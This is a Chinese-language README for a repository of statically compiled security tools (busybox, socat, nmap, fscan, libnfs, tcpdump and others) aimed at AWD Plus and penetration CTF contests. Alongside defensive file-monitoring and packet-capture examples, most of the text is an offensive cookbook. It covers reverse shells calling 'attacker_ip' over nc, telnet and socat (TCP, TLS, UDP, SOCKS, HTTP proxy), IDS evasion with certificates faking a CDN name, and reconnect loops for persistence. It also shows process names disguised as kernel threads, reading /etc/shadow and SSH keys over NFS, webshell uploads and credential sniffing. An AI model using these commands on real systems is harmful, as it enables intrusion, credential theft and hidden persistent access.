# Precompile Tools —— 静态编译网络安全工具集

本仓库提供一套通过 musl libc **静态编译**的网络安全工具，适用于 **AWD Plus (AWDP)** 和**渗透挑战赛**场景。所有二进制文件均为独立可执行文件，无需依赖系统动态库，可直接上传至目标靶机使用。

## 目录结构

```
precompile_tools/
├── Dockerfile                  # Alpine 静态编译环境
├── busybox                     # BusyBox 1.36.1 (245+ applet)
├── inotify-tools/
│   ├── inotifywait             # 文件系统事件监控
│   └── inotifywatch            # 文件系统事件统计
├── libnfs/
│   ├── nfs-cat                 # 读取 NFS 共享文件
│   ├── nfs-cp                  # 复制文件到/从 NFS 共享
│   ├── nfs-ls                  # 列出 NFS 共享目录
│   └── nfs-stat                # 查看 NFS 共享文件属性
└── net/
    ├── fscan                   # 综合内网扫描器 (Go)
    ├── nmap                    # Nmap 7.99SVN 网络扫描
    ├── redsocks                # TCP 透明代理 (SOCKS/HTTP)
    ├── socat                   # 双向数据通道中继 (OpenSSL)
    └── tcpdump                 # 网络抓包分析
```

## 构建环境 (Dockerfile)

基于 Alpine Linux 构建，依赖组件：

| 组件 | 用途 |
|------|------|
| `build-base` | GCC/make 等编译工具链 |
| `linux-headers` | Linux 内核头文件 |
| `cmake` / `git` / `wget` / `curl` | 源码获取与构建 |
| `openssl-libs-static` | TLS/SSL 静态链接 |
| `readline-static` | 命令行编辑静态链接 |
| `ncurses-static` | 终端 UI 静态链接 |
| `zlib-static` | 压缩库静态链接 |

```bash
# 构建编译环境
docker build -t static-build .

# 进入容器编译
docker run -it --rm -v $(pwd):/out static-build /bin/sh
```

所有二进制文件格式：**x86-64 ELF, static-pie linked**（除 `fscan` 为动态链接 Go 程序）。

---

## 工具详解与 CTF 使用示例

---

### 1. busybox —— 嵌入式 Linux 瑞士军刀

**版本**: 1.36.1  
**大小**: 1.2 MB  
**支持 Applet**: 245+，包括 shell、文件工具、网络工具、系统工具等。

```bash
# 查看所有 applet
./busybox --list

# 使用方式一：直接调用
./busybox wget http://10.0.0.1/shell.sh -O /tmp/shell.sh

# 使用方式二：创建符号链接后直接使用
ln -s busybox nc
./nc -lvp 9999
```

#### CTF 场景示例

**场景 1: 靶机环境受限，缺少基础命令**

```bash
# 上传 busybox 到靶机后建立符号链接
for cmd in $(./busybox --list); do
    ln -s /tmp/busybox /tmp/$cmd 2>/dev/null
done
export PATH=/tmp:$PATH

# 现在可以使用 wget, tar, gzip, nc, ps, top 等全部命令
wget http://attacker_server/payload.tar.gz
tar xzf payload.tar.gz
```

**场景 2: AWDP 应急响应 - 进程排查**

```bash
./busybox ps aux                          # 查看所有进程
./busybox netstat -tlnp                   # 查看监听端口
./busybox lsof -i                         # 查看网络连接
./busybox top -bn1                        # 一次性输出进程资源占用
```

**场景 3: 利用 httpd 快速搭建文件下载服务**

```bash
# 在靶机 /tmp 下开启 HTTP 服务，供其他队员/靶机下载工具
./busybox httpd -f -p 8080 -h /tmp/
```

**场景 4: nc (netcat) 反弹 Shell**

```bash
# === 靶机执行（反弹到攻击机）===
# 方式 A：-e 参数（部分 nc 版本支持）
./busybox nc attacker_ip 9999 -e /bin/sh

# 方式 B：管道方式（更通用，不依赖 -e）
./busybox nc attacker_ip 9999 -e /bin/sh
# 如果不支持 -e，用管道：
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | ./busybox nc attacker_ip 9999 > /tmp/f
```

**场景 5: telnet 反弹 Shell**

```bash
# 攻击机开启两个端口监听（一个收命令输出，一个发命令输入）
# 攻击机终端1：接收输出
./busybox nc -lvp 8888
# 攻击机终端2：发送命令
./busybox nc -lvp 9999

# 靶机执行
rm -f /tmp/f; mkfifo /tmp/f
./busybox telnet attacker_ip 8888 < /tmp/f | /bin/sh 2>&1 | ./busybox telnet attacker_ip 9999 > /tmp/f
```

---

### 2. inotifywait —— 文件系统事件监控

**版本**: 4.23.9.0  
**大小**: 170 KB

监控文件系统变化（创建、修改、删除、移动等），是 AWDP 中**文件监控防篡改**的核心工具。

```bash
# 基本语法
./inotify-tools/inotifywait [options] <path>

# 监控 /var/www/html 下所有文件的修改事件
./inotify-tools/inotifywait -m -r -e modify /var/www/html

# 自定义输出格式 (时间|事件|路径)
./inotify-tools/inotifywait -m -r --format '%T %e %w%f' --timefmt '%H:%M:%S' /var/www/html
```

#### CTF 场景示例

**场景 1: AWDP 实时监控 Web 目录被篡改**

```bash
# 持续监控 web 目录，发现修改立即告警
./inotify-tools/inotifywait -m -r \
    -e modify,create,delete,move \
    --format '%T [%e] %w%f' --timefmt '%Y-%m-%d %H:%M:%S' \
    /var/www/html | tee /tmp/web_monitor.log &

# 一旦发现异常，立即执行应急响应
# 可以配合 --exec 或管道后处理
```

**场景 2: 监控敏感配置文件是否被读取**

```bash
# 监控 /etc/shadow 和 /etc/passwd 的访问
./inotify-tools/inotifywait -m \
    -e access,modify,open \
    /etc/shadow /etc/passwd &

# 在 AWDP 中可发现对手队的提权/信息收集行为
```

**场景 3: 监控 /tmp 目录下的 webshell 投递**

```bash
# 监控临时目录文件创建
./inotify-tools/inotifywait -m -r \
    -e create \
    --exclude '\.sock$' \
    /tmp | while read line; do
    echo "[ALERT] New file in /tmp: $line"
    # 自动查杀逻辑
done
```

---

### 3. inotifywatch —— 文件系统事件统计

**版本**: 4.23.9.0  
**大小**: 158 KB

收集一段时间内的文件事件统计信息，用于分析文件系统活动热点。

```bash
# 统计 /var/www 30 秒内的事件
./inotify-tools/inotifywatch -r -t 30 /var/www
```

#### CTF 场景示例

**场景: AWDP 赛前基线统计 vs 赛中异常对比**

```bash
# 赛前：收集 5 分钟基线事件统计
./inotify-tools/inotifywatch -r -t 300 /var/www/html > /tmp/baseline.log

# 赛中：持续统计，与基线对比发现异常活动
watch -n 60 './inotify-tools/inotifywatch -r -t 30 /var/www/html'
```

---

### 4. nfs-cat —— NFS 直接文件读取

**大小**: 461 KB

不挂载 NFS 直接读取 NFS 共享上的文件内容。

```bash
# 语法
./libnfs/nfs-cat nfs://<server>/<path>

# 读取 NFS 服务器上的 /etc/passwd
./libnfs/nfs-cat nfs://192.168.1.100/etc/passwd
```

#### CTF 场景示例

**场景 1: 渗透中利用 NFS 未授权访问读取敏感文件**

```bash
# 发现 NFS 共享后直接读取文件
./libnfs/nfs-cat nfs://10.0.0.5/etc/shadow            # 读取密码哈希
./libnfs/nfs-cat nfs://10.0.0.5/home/user/.ssh/id_rsa # 读取 SSH 私钥
./libnfs/nfs-cat nfs://10.0.0.5/flag                  # CTF flag
```

**场景 2: 读取 NFS 共享的 Web 源码**

```bash
# 读取 NFS 上 Web 应用源码，审计脆弱点
./libnfs/nfs-cat nfs://10.0.0.5/var/www/html/config.php
```

---

### 5. nfs-cp —— NFS 文件复制

**大小**: 465 KB

在本地文件系统与 NFS 共享之间复制文件。

```bash
# 从 NFS 下载到本地
./libnfs/nfs-cp nfs://192.168.1.100/flag.txt /tmp/flag.txt

# 从本地上传到 NFS
./libnfs/nfs-cp /tmp/payload.sh nfs://192.168.1.100/tmp/payload.sh
```

#### CTF 场景示例

**场景 1: AWDP 上传 webshell 到对手靶机 NFS 共享**

```bash
# 利用对手 NFS 未授权访问，上传 webshell
./libnfs/nfs-cp /tmp/shell.php nfs://10.0.0.50/var/www/html/shell.php
```

**场景 2: 窃取 NFS 上的 flag 文件**

```bash
# 从 NFS 下载 flag
for ip in $(seq 1 254); do
    ./libnfs/nfs-cp nfs://10.0.0.$ip/flag /tmp/flags/flag_$ip 2>/dev/null &
done
```

---

### 6. nfs-ls —— NFS 目录列举

**大小**: 465 KB

列出 NFS 共享的目录内容，支持递归和发现模式。

```bash
# 列出 NFS 共享根目录
./libnfs/nfs-ls nfs://192.168.1.100/

# 递归列出所有文件
./libnfs/nfs-ls -R nfs://192.168.1.100/home/

# 发现 NFS 服务器
./libnfs/nfs-ls -D nfs://192.168.1.100/
```

#### CTF 场景示例

**场景 1: 渗透中枚举 NFS 共享目录结构**

```bash
# 递归列出所有文件，快速定位 flag 和敏感文件
./libnfs/nfs-ls -R nfs://10.0.0.10/ 2>/dev/null
```

**场景 2: 批量探测内网 NFS 服务**

```bash
# 探测 C 段所有 NFS 共享
for ip in $(seq 1 254); do
    result=$(./libnfs/nfs-ls nfs://10.0.0.$ip/ 2>&1)
    if [ $? -eq 0 ]; then
        echo "[FOUND] NFS at 10.0.0.$ip"
    fi
done
```

---

### 7. nfs-stat —— NFS 文件属性查看

**大小**: 477 KB

查看 NFS 共享上文件/目录的元信息（权限、大小、时间戳等）。

```bash
./libnfs/nfs-stat nfs://192.168.1.100/etc/passwd
```

#### CTF 场景示例

```bash
# 查看 flag 文件属性，确定是否有读取权限
./libnfs/nfs-stat nfs://10.0.0.20/flag

# 检查可写入目录
./libnfs/nfs-stat nfs://10.0.0.20/tmp/
```

---

### 8. fscan —— 综合内网扫描器

**版本**: 2.1.3  
**大小**: 51.3 MB  
**语言**: Go (动态链接)

集端口扫描、服务识别、漏洞检测、弱口令爆破、漏洞利用于一体的综合工具。

```bash
# 基本扫描
./net/fscan -h 192.168.1.1

# 指定端口范围
./net/fscan -h 192.168.1.1/24 -p 22,80,3306,6379

# 漏洞扫描模式
./net/fscan -h 192.168.1.1 -m poc
```

#### CTF 场景示例

**场景 1: AWDP 开赛快速信息收集**

```bash
# 对目标网段全量扫描，输出 JSON 便于自动化解析
./net/fscan -h 10.0.0.0/24 \
    -p 21,22,80,443,3306,6379,8080 \
    -o /tmp/scan_result.json

# 快速分析结果
cat /tmp/scan_result.json | jq '.[] | {ip: .host, ports: .ports[] | .port}'
```

**场景 2: 利用弱口令批量自动化攻击**

```bash
# 对扫描到的 SSH 弱口令进行批量连接
for ip in $(cat /tmp/ssh_targets.txt); do
    ./net/fscan -h $ip -m ssh -user root -pwd root &
done
```

**场景 3: 发现 Redis 未授权访问**

```bash
# Redis 未授权扫描 + 公钥写入
./net/fscan -h 10.0.0.0/24 -p 6379 -m redis
```

---

### 9. nmap —— 网络扫描经典

**版本**: 7.99SVN  
**大小**: 11.9 MB  
**特性**: OpenSSL, Lua NSE 脚本引擎, IPv6

```bash
# SYN 半连接扫描
./net/nmap -sS 192.168.1.0/24

# 服务版本检测 + OS 指纹
./net/nmap -sV -O 192.168.1.1

# NSE 脚本扫描
./net/nmap --script vuln 192.168.1.1

# 快速存活扫描
./net/nmap -sn 192.168.1.0/24
```

#### CTF 场景示例

**场景 1: 内网存活探测 + 端口扫描**

```bash
# 第一步：ICMP ping 扫存活主机
./net/nmap -sn -oG /tmp/alive.txt 10.0.0.0/24

# 第二步：对存活主机做详细端口扫描
grep "Up" /tmp/alive.txt | cut -d' ' -f2 > /tmp/ips.txt
./net/nmap -sS -sV -p- -iL /tmp/ips.txt -oA /tmp/full_scan
```

**场景 2: AWDP 对手服务识别**

```bash
# 快速识别对手 Web 服务技术栈
./net/nmap -sV --script=http-headers,http-enum,http-title \
    -p 80,443,8080,8000 10.0.0.0/24
```

**场景 3: 利用 NSE 探测已知漏洞**

```bash
# 探测常见 Web 漏洞
./net/nmap --script=http-sql-injection,http-shellshock \
    -p 80 10.0.0.50
```

---

### 10. redsocks —— 透明 TCP 代理

**版本**: 0.5-11-g19b822e  
**大小**: 365 KB

利用 iptables REDIRECT/TPROXY 将 TCP 流量透明转发至 SOCKS/HTTP 代理。

#### CTF 场景示例

**场景: 通过跳板机建立隐蔽通信隧道**

```bash
# 创建 redsocks 配置文件 redsocks.conf
cat > /tmp/redsocks.conf << 'EOF'
base {
    log_debug = on;
    log_info = on;
    log = "file:/tmp/redsocks.log";
    daemon = on;
    redirector = iptables;
}
redsocks {
    local_ip = 127.0.0.1;
    local_port = 12345;
    ip = 10.0.0.100;    # SOCKS 代理服务器
    port = 1080;
    type = socks5;
}
EOF

# 启动 redsocks
./net/redsocks -c /tmp/redsocks.conf

# 配置 iptables 规则 (需 root)
iptables -t nat -A OUTPUT -p tcp -d 0/0 -j REDIRECT --to-ports 12345
```

**场景 2: 出站流量绕过防火墙**

```bash
# 将所有本地出站流量通过 SOCKS5 隧道转发
# 穿透防火墙访问内网资源
./net/redsocks -c /tmp/redsocks.conf
```

---

### 11. socat —— 网络瑞士军刀

**版本**: 1.8.0.1  
**大小**: 6.5 MB  
**特性**: OpenSSL/TLS, readline, TUN/TAP, SOCKS, HTTP代理, PTY, EXEC

支持 100+ 种地址类型，是 CTF 中最灵活的网络工具。

```bash
# TCP 端口转发
./net/socat TCP-LISTEN:8080,fork,reuseaddr TCP:192.168.1.100:80

# 加密正/反向 shell (OpenSSL)
# 服务端
./net/socat OPENSSL-LISTEN:443,cert=server.pem,verify=0,fork EXEC:/bin/bash
# 客户端
./net/socat OPENSSL:server_ip:443,verify=0 EXEC:/bin/bash

# 反弹 shell (明文)
./net/socat TCP:attacker_ip:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

#### CTF 场景示例

**场景 1: 基础反向 Shell (明文 TCP)**

```bash
# 攻击机监听
./net/socat TCP-LISTEN:9999,reuseaddr STDOUT,raw,echo=0

# 靶机反弹（无伪终端，基础版）
./net/socat TCP:attacker_ip:9999 EXEC:/bin/sh

# 靶机反弹（带 PTY 伪终端，支持 Ctrl+C、vim 等全交互）
./net/socat TCP:attacker_ip:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**场景 2: SSL/TLS 加密反向 Shell —— 绕过 IDS/IPS**

```bash
# 攻击机生成自签名证书
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=cdn.example.com"

# 攻击机监听 (加密)
./net/socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork \
    STDOUT,raw,echo=0

# 靶机执行反弹 (加密，流量在 IDS 中显示为 HTTPS，难以检测)
./net/socat OPENSSL:attacker_ip:443,verify=0 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**场景 3: 端口复用穿透内网**

```bash
# 靶机 (跳板) 上将本地 3389 端口转发到内网 Windows 机器
./net/socat TCP-LISTEN:3389,fork,reuseaddr TCP:192.168.1.50:3389 &

# 或者转发到多层内网
./net/socat TCP-LISTEN:2222,fork,reuseaddr \
    SOCKS4:10.0.0.100:192.168.2.50:22,socksport=1080
```

**场景 4: AWDP 绕过端口封锁**

```bash
# 对手封了 80 端口？用 socat 做端口映射
# 在靶机用户空间监听 8080 → 转发到本地 80
./net/socat TCP-LISTEN:8080,fork,reuseaddr TCP:127.0.0.1:80 &
```

**场景 5: 建立 TUN 隧道**

```bash
# 在两台机器间建立虚拟网卡隧道
# Server
./net/socat TCP-LISTEN:7777 TUN:192.168.99.1/24,up
# Client
./net/socat TCP:server:7777 TUN:192.168.99.2/24,up
```

**场景 6: 快速文件传输**

```bash
# 发送端
./net/socat -u FILE:payload.tar.gz TCP-LISTEN:8888,reuseaddr

# 接收端
./net/socat -u TCP:send_ip:8888 CREATE:/tmp/payload.tar.gz
```

**场景 7: 多版本反向 Shell 详解**

socat 是 CTF 中最强大的反弹 Shell 工具，以下是各场景详解：

**① 基础反向 Shell（明文 TCP）**

```bash
# 靶机执行
./net/socat TCP:attacker_ip:9999 EXEC:/bin/sh
```

**② 全交互 PTY 反向 Shell**

> **关键参数说明**: `pty` 分配伪终端（支持 Ctrl+C、Ctrl+Z 等信号）、`stderr` 将 stderr 重定向到 socket、`setsid` 创建新会话脱离当前终端、`sigint` 传递 SIGINT 信号给子进程、`sane` 终端行规范模式。

```bash
# 靶机执行（等待连接）
./net/socat TCP-LISTEN:9999,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
# 或主动反弹
./net/socat TCP:attacker_ip:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# 攻击机监听（获得稳定交互终端）
./net/socat file:$(tty),raw,echo=0 TCP-LISTEN:9999
```

**③ SSL/TLS 加密反向 Shell**

```bash
# 攻击机: 生成证书并监听
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 30 -nodes -subj "/CN=cdn.example.com"
./net/socat OPENSSL-LISTEN:443,cert=cert.pem,verify=0,fork STDOUT,raw,echo=0

# 靶机反弹（加密流量，IDS 显示为 HTTPS）
./net/socat OPENSSL:attacker_ip:443,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**④ Fork 持久化反向 Shell（目标断开后自动重新连接）**

```bash
# 攻击机 fork 模式（可同时接多个连接）
./net/socat TCP-LISTEN:9999,fork,reuseaddr STDOUT,raw,echo=0

# 靶机无限重连（断线自动恢复）
while true; do
    ./net/socat TCP:attacker_ip:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
    sleep 5
done &
```

**⑤ 通过 SOCKS 代理反弹（多层网络穿透）**

```bash
# 场景：攻击机 10.0.0.1，跳板机 10.0.0.5(SOCKS5:1080)，靶机在 172.16.0.100
# 攻击机先建立 SOCKS 隧道到跳板机，然后靶机通过 SOCKS 反弹到攻击机

# 靶机通过跳板机 SOCKS 反弹
./net/socat SOCKS4:10.0.0.5:attacker_ip:9999,socksport=1080 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**⑥ 通过 HTTP 代理反弹**

```bash
# 靶机通过 HTTP CONNECT 代理反弹
./net/socat PROXY:proxy_ip:attacker_ip:9999,proxyport=8080 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

**⑦ UDP 反弹 Shell（绕过只拦截 TCP 的防火墙）**

```bash
# 攻击机 UDP 监听
./net/socat UDP-LISTEN:9999 STDOUT

# 靶机 UDP 反弹
./net/socat UDP:attacker_ip:9999 EXEC:/bin/sh
```

**⑧ SCTP 反弹 Shell**

```bash
# 攻击机 SCTP 监听
./net/socat SCTP-LISTEN:9999 STDOUT

# 靶机 SCTP 反弹
./net/socat SCTP:attacker_ip:9999 EXEC:/bin/sh
```

**⑨ 进程隐藏技巧**

```bash
# 修改进程名为系统进程，躲避 ps 排查
exec -a "[kworker/u:1]" ./net/socat TCP:attacker:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &
```

---

### 12. tcpdump —— 网络数据包分析

**版本**: 4.99.4  
**大小**: 1.9 MB  
**特性**: BPF 过滤器, pcap 读写, 文件轮转

```bash
# 抓取所有 HTTP 流量
./net/tcpdump -i eth0 tcp port 80 -w http.pcap

# 实时查看 DNS 查询
./net/tcpdump -i eth0 udp port 53 -n -v

# 抓取特定主机流量
./net/tcpdump -i eth0 host 192.168.1.100 -w target.pcap

# 从 pcap 中读取分析
./net/tcpdump -r capture.pcap -A
```

#### CTF 场景示例

**场景 1: AWDP 抓取攻击流量进行溯源**

```bash
# 启动抓包，持续记录所有流量
./net/tcpdump -i eth0 -n -s 0 -W 100 -C 50 -w /tmp/traffic.pcap &

# 发现异常后分析攻击者 IP 和攻击手法
./net/tcpdump -r /tmp/traffic.pcap -n host 10.0.0.66 | head -100
```

**场景 2: 抓取队友/对手的明文密码**

```bash
# 抓取 HTTP POST 中的登录凭证
./net/tcpdump -i eth0 -A 'tcp port 80 and (tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x504f5354)'

# 抓取 FTP 密码
./net/tcpdump -i eth0 -A 'tcp port 21'
```

**场景 3: 分析是否存在 ARP 欺骗**

```bash
# 检测 ARP 攻击
./net/tcpdump -i eth0 -n arp | grep "arp reply" | while read line; do
    echo "[WARN] ARP 响应: $line"
done
```

**场景 4: 提取 HTTP 流量中的文件**

```bash
# 抓 HTTP 流量到文件
./net/tcpdump -i eth0 tcp port 80 -w /tmp/http.pcap

# 使用 strings 快速提取可读内容
./busybox strings /tmp/http.pcap | grep -iE 'password|flag|secret|token'
```

---

## 反弹 Shell 专题 —— 全方位对照手册

> 本节汇总本仓库中**所有可用于反弹 Shell 的工具**，按场景分类，标注适用条件和关键说明。

### 工具对比速查表

| 工具 | 加密 | PTY 交互 | 断线重连 | 体积 | 适用场景 |
|------|:----:|:-------:|:-------:|------|----------|
| `busybox nc` | ❌ | ❌ | ❌ | 1.2M | 轻量、最通用、管道绕过无 -e |
| `socat` (TCP) | ❌ | ✅ | ✅ | 6.5M | **首选**，全交互终端 |
| `socat` (SSL) | ✅ | ✅ | ✅ | 6.5M | 加密通信、绕过 IDS |
| `socat` (SOCKS) | ❌ | ✅ | ✅ | 6.5M | 多层内网穿透 |
| `socat` (UDP) | ❌ | ❌ | ❌ | 6.5M | 绕过 TCP-only 防火墙 |
| `busybox telnet` | ❌ | ❌ | ❌ | 1.2M | 无 nc 时的备选方案 |

---

### 1. busybox nc 反弹 Shell

> **说明**: `-e` 参数并非所有 nc 版本都支持，管道 FIFO 方式最通用。缺点是无 PTY，不能运行 vim、su 等交互式程序。

```bash
# === 方式 A：-e 参数（简洁但可能不支持）===
./busybox nc attacker_ip 9999 -e /bin/sh

# === 方式 B：管道 FIFO（最通用，推荐）===
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | ./busybox nc attacker_ip 9999 > /tmp/f

# === 方式 C：mkfifo + 重定向（可复用连接）===
rm -f /tmp/f; mkfifo /tmp/f
while true; do
    cat /tmp/f | /bin/sh -i 2>&1 | ./busybox nc -lkp 9999 > /tmp/f
done &
# 攻击机: nc target_ip 9999
```

> **关键说明**: `-i` 参数使 shell 进入交互模式，`2>&1` 将标准错误也发送给攻击机，`mkfifo` 创建命名管道打通 stdin/stdout 双向数据流。

---

### 2. socat 反弹 Shell（全场景覆盖）

#### 2.1 基础 TCP 反弹

> **说明**: 最简单的方式，无加密无伪装，适合内网直连场景。

```bash
# 靶机
./net/socat TCP:attacker_ip:9999 EXEC:/bin/sh

# 攻击机
./net/socat TCP-LISTEN:9999 STDOUT
```

#### 2.2 PTY 全交互反弹

> **关键参数详解**:
> - `pty`: 分配伪终端，使目标进程认为自己运行在真实终端上（支持 Ctrl+C、Ctrl+Z、tab 补全）
> - `stderr`: 将子进程的标准错误重定向到 socket，否则错误信息会丢失
> - `setsid`: 创建新的会话 ID，使 shell 脱离当前终端控制（避免终端关闭时子进程 SIGHUP）
> - `sigint`: 将攻击方按 Ctrl+C 产生的 SIGINT 传递给子进程（不是给 socat 自身）
> - `sane`: 进入 PTY 时设置终端行规范模式，防止终端状态混乱

```bash
# 靶机
./net/socat TCP:attacker_ip:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# 攻击机（推荐方式）
stty raw -echo; ./net/socat file:$(tty),raw,echo=0 TCP-LISTEN:9999; stty sane
# 说明: stty raw -echo 关闭本地回显，raw 模式使攻击机按原始字符传递
```

#### 2.3 SSL/TLS 加密反弹（推荐生产使用）

> **说明**: 流量在 IDS/WAF 中显示为 HTTPS，配合 443 端口几乎无法被检测。证书可以是自签名的，因为 `verify=0` 不会验证。

```bash
# 攻击机: 生成自签名证书
openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem \
    -days 30 -nodes -subj "/CN=cloudflare.com"

# 攻击机: 监听
./net/socat OPENSSL-LISTEN:443,cert=/tmp/cert.pem,verify=0,fork \
    STDOUT,raw,echo=0

# 靶机: 反弹
./net/socat OPENSSL:attacker_ip:443,verify=0 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

#### 2.4 Fork 模式——多客户端并发 + 断线重连

> **说明**: `fork` 使攻击机可以同时接收多个连接（每个连接独立交互窗口）。靶机用 while 循环实现断线重连，避免因网络波动丢失控制权。

```bash
# 攻击机: fork 监听（接受多连接）
./net/socat TCP-LISTEN:9999,fork,reuseaddr STDOUT,raw,echo=0

# 靶机: 无限重连（5秒间隔）
while true; do
    ./net/socat TCP:attacker_ip:9999 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
    sleep 5
done &
```

#### 2.5 通过 SOCKS 代理反弹（多层网络穿透）

> **说明**: 当靶机不能直连攻击机时，通过已有的 SOCKS 跳板完成反弹。适用于多层内网横向移动。

```bash
# 假设跳板机 10.0.0.5 已搭建 SOCKS5 代理（端口 1080）
# 靶机通过跳板机的 SOCKS5 代理连接到攻击机
./net/socat SOCKS4:10.0.0.5:attacker_ip:9999,socksport=1080 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

#### 2.6 通过 HTTP 代理反弹

> **说明**: 当目标网络允许 HTTP/HTTPS 出站但拦截其他流量时，通过 HTTP CONNECT 方法建立隧道。

```bash
./net/socat PROXY:proxy_ip:attacker_ip:9999,proxyport=8080 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

#### 2.7 UDP 反弹（绕过 TCP 流量审计）

> **说明**: 部分防火墙/WAF 只审计 TCP 流量，UDP 反弹可绕过。缺点是无连接、不保证送达、不支持 PTY。

```bash
# 攻击机
./net/socat UDP-LISTEN:9999 STDOUT

# 靶机
./net/socat UDP:attacker_ip:9999 EXEC:/bin/sh
```

#### 2.8 反向连接变种：正向绑定（靶机监听，攻击机连入）

> **说明**: 反弹（Reverse）是靶机出站连攻击机（穿透 NAT/防火墙）；正向绑定（Bind）是靶机开端口，攻击机主动连入。

```bash
# 靶机: 在本地 9999 端口开 shell，等待连入
./net/socat TCP-LISTEN:9999,reuseaddr EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# 攻击机: 连入靶机
./net/socat TCP:target_ip:9999 STDOUT,raw,echo=0
```

#### 2.9 进程隐藏技巧

> **说明**: 在 AWDP 中，对手会通过 `ps aux` 排查恶意进程。使用 `exec -a` 可修改进程名，伪装为系统进程。

```bash
exec -a "[kworker/u:1]" ./net/socat TCP:attacker:9999 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &

exec -a "[rcu_gp]" ./net/socat TCP:attacker:9999 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &

exec -a "systemd-journald" ./net/socat TCP:attacker:9999 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &
```

---

### 3. busybox telnet 反弹 Shell

> **说明**: 当目标没有 nc 但有 telnet 时，使用双端口方案模拟反弹 shell（一个端口发命令，一个端口收输出）。

```bash
# 攻击机: 开两个终端
# 终端1：接收命令输出
./busybox nc -lvp 8888
# 终端2：发送键盘输入
./busybox nc -lvp 9999

# 靶机执行
rm -f /tmp/f; mkfifo /tmp/f
./busybox telnet attacker_ip 8888 < /tmp/f | \
    /bin/sh 2>&1 | \
    ./busybox telnet attacker_ip 9999 > /tmp/f
```

---

### 4. 实战选择指南

```
                    ┌─ 目标有 socat? ──── 是 ──→ 使用 socat SSL/PTY 反弹（最佳方案）
                    │
获得 Shell 后 ─── 要加密? ──── 是 ──→ socat OPENSSL（绕过 IDS）
    │               │
    │               └── 否 ──→ 要全交互? ──── 是 ──→ socat PTY
    │                              │
    │                              └── 否 ──→ busybox nc FIFO（最小体积）
    │
    └── 只有 busybox? ──── 是 ──→ busybox nc 管道方式（最通用）
         │
         └── 无 nc 有 telnet? ──→ busybox telnet 双端口方案
```

### 攻击机监听设置指南

```bash
# ===== 推荐：使用 socat 作为监听端（功能最全）=====
# 基础监听
./net/socat TCP-LISTEN:9999,reuseaddr STDOUT

# Fork 模式（支持多连接，每个 kill 后重新监听）
./net/socat TCP-LISTEN:9999,fork,reuseaddr STDOUT

# 配合 rlwrap 获得 readline 历史记录和行编辑
rlwrap ./net/socat TCP-LISTEN:9999,reuseaddr STDOUT

# 完整 PTY 监听（搭配靶机 PTY 反弹）
stty raw -echo; ./net/socat file:$(tty),raw,echo=0 TCP-LISTEN:9999; stty sane

# SSL 加密监听
./net/socat OPENSSL-LISTEN:443,cert=/tmp/cert.pem,verify=0,fork STDOUT

# ===== 备选：使用 busybox nc 作为监听端 =====
./busybox nc -lvp 9999

# ===== 进阶：使用 socat 将监听转发到 Metasploit handler =====
# socat 端口转发 → msf multi/handler
./net/socat TCP-LISTEN:443,fork,reuseaddr TCP:127.0.0.1:4444 &
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run"
```

---

## CTF 综合实战场景

### AWDP 开局流程

```bash
# ============ 1. 环境准备 ============
# 上传所有工具到靶机
tar czf tools.tar.gz busybox inotify-tools/ libnfs/ net/
# scp tools.tar.gz user@target:/tmp/
# 在靶机上
tar xzf /tmp/tools.tar.gz -C /tmp/
cd /tmp

# 建立 busybox 符号链接
for cmd in $(./busybox --list); do
    ln -sf /tmp/busybox /tmp/$cmd 2>/dev/null
done
export PATH=/tmp:$PATH

# ============ 2. 信息收集 ============
# 快速扫描内网存活主机和开放端口
./net/nmap -sS -sV -p 21,22,80,443,3306,6379,8080 10.0.0.0/24 -oA /tmp/scan

# ============ 3. 文件监控 ============
# 启动持续文件监控
./inotify-tools/inotifywait -m -r \
    -e modify,create,delete,move \
    --format '%T [%e] %w%f' --timefmt '%Y-%m-%d %H:%M:%S' \
    /var/www/html /etc /home 2>&1 | \
    tee /tmp/monitor.log &

# ============ 4. 流量抓取 ============
# 抓取全部流量
./net/tcpdump -i eth0 -n -s 0 -W 50 -C 100 -w /tmp/traffic.pcap &

# ============ 5. 建立持久化通信 ============
# SSL 加密反弹 Shell
./net/socat OPENSSL:your_server:443,verify=0 \
    EXEC:/bin/bash,pty,stderr,setsid,sigint,sane &

# ============ 6. 攻击对手 ============
# 针对扫描结果中的漏洞进行利用
# Redis 未授权
./net/fscan -h 10.0.0.x -p 6379 -m redis

# 或者手动利用
./net/socat TCP-LISTEN:6379,fork TCP:10.0.0.x:6379
```

### 渗透挑战赛典型流程

```bash
# ============ 外网打点 ============
# 全面扫描目标
./net/nmap -sS -sV -sC -O -p- target.com -oA /tmp/recon

# 用 fscan 做 POC 扫描
./net/fscan -h target.com -m poc -o /tmp/poc_result.json

# ============ 获得立足点后 ============
# 上传工具包建立环境

# 1) 发现 NFS 服务，直连读取文件
